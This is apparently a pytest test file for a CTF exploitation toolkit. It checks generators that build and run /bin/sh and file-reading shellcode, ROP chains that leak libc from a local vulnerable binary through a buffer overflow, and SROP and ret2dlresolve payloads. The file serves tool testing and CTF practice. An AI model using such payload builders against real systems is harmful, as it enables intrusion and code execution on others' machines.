"""shellgen, ropchain and sropkit: the payloads they build are run or checked."""

from __future__ import annotations

import pytest

from ctftools.core.binary import load_binary
from ctftools.tools import ropchain, shellgen, sropkit


# ----------------------------------------------------------------- shellgen
def test_sh_shellcode_opens_a_shell():
    code = shellgen.build("sh", "amd64")
    assert code
    ok, detail = shellgen.test_run(code, "amd64")
    assert ok, detail


def test_orw_shellcode_reads_a_real_file(tmp_path):
    flag = tmp_path / "flag.txt"
    flag.write_text("flag{orw_works}\n")
    code = shellgen.build("orw", "amd64", path=str(flag))
    ok, detail = shellgen.test_orw(code, str(flag), "amd64")
    assert ok, detail
    assert "orw_works" in detail


def test_i386_shellcode_builds():
    code = shellgen.build("sh", "i386")
    assert code and len(code) < 100


def test_unavoidable_bad_bytes_are_reported_not_hidden():
    code = shellgen.build("sh", "amd64")
    with pytest.raises(RuntimeError) as exc:
        shellgen.encode_without(code, b"\x48", "amd64")
    assert "0x48" in str(exc.value) or "REX" in str(exc.value)


def test_encoding_is_skipped_when_nothing_is_bad():
    code = shellgen.build("sh", "amd64")
    encoded, how = shellgen.encode_without(code, b"\x00\x0a", "amd64")
    assert encoded == code
    assert how == "none needed"


def test_report_counts_remaining_bad_bytes():
    report = shellgen.generate("sh", "amd64", bad=b"\x00\x0a")
    assert report.data["bad_bytes_remaining"] == []
    assert report.data["size"] > 0


# ----------------------------------------------------------------- ropchain
def test_leak_chain_has_the_right_slots(target):
    info = load_binary(target("nx_rop"))
    chain, code = ropchain.leak_chain(info)
    words = [int.from_bytes(chain[i:i + 8], "little") for i in range(0, len(chain), 8)]
    assert info.elf.got["puts"] in words
    assert info.elf.plt["puts"] in words
    assert info.elf.sym["main"] in words
    assert "rop.puts" in code


def test_leak_chain_actually_leaks_libc(target):
    """Run the chain against the live process and resolve the libc base."""
    from pwnlib.context import context
    from pwnlib.elf import ELF
    from pwnlib.tubes.process import process
    from pwnlib.util.packing import u64

    context.clear()
    context.log_level = "error"
    path = target("nx_rop")
    info = load_binary(path)
    chain, _ = ropchain.leak_chain(info)

    io = process([path])
    try:
        io.recvline()
        io.send(b"A" * 88 + chain + b"\n")
        leak = u64(io.recvline().strip().ljust(8, b"\x00"))
    finally:
        io.close()

    assert leak > 0x7F0000000000, f"{leak:#x} does not look like a libc address"
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    base = leak - libc.sym["puts"]
    assert base % 0x1000 == 0, f"libc base {base:#x} is not page aligned"


def test_chain_reports_bad_bytes(target):
    report = ropchain.build(target("nx_rop"), "leak", offset=88, bad=b"\x40")
    assert report.data["bad_bytes_present"], "0x40 is in every 0x40xxxx address here"


def test_execve_chain_without_a_binsh_string_explains_itself(target):
    with pytest.raises(ropchain.ChainError) as exc:
        ropchain.execve_chain(load_binary(target("nx_rop")))
    assert "/bin/sh" in str(exc.value)


def test_system_chain_needs_a_libc(target):
    with pytest.raises(ropchain.ChainError):
        ropchain.build(target("nx_rop"), "system")


# ------------------------------------------------------------------ sropkit
def test_srop_frame_is_built_from_a_syscall_gadget(target):
    info = load_binary(target("nx_rop"))
    report = sropkit.srop(info, offset=88)
    assert report.data["frame_size"] == 248
    assert report.data["syscall_gadget"]
    assert report.data["pop_rax_gadget"]
    assert len(bytes.fromhex(report.data["payload_hex"])) == 88 + len(
        bytes.fromhex(report.data["chain_hex"])
    )


def test_srop_warns_when_the_string_must_be_staged(target):
    report = sropkit.srop(load_binary(target("nx_rop")), offset=88)
    assert report.data["string_staged"] is True
    assert any("bss" in w or ".bss" in w for w in report.warnings)


def test_srop_without_a_syscall_gadget_is_refused(target):
    with pytest.raises(sropkit.KitError) as exc:
        sropkit.srop(load_binary(target("stack_basic")), offset=72)
    assert "syscall" in str(exc.value)


def test_dlresolve_payload_is_built(target):
    report = sropkit.dlresolve(load_binary(target("nx_rop")), offset=88)
    assert report.data["symbol"] == "system"
    assert report.data["data_address"]
    assert len(report.data["payload_hex"]) > 100


def test_dlresolve_refuses_full_relro(target, monkeypatch):
    info = load_binary(target("nx_rop"))
    info.relro = "Full RELRO"
    with pytest.raises(sropkit.KitError) as exc:
        sropkit.dlresolve(info, offset=88)
    assert "Full RELRO" in str(exc.value)
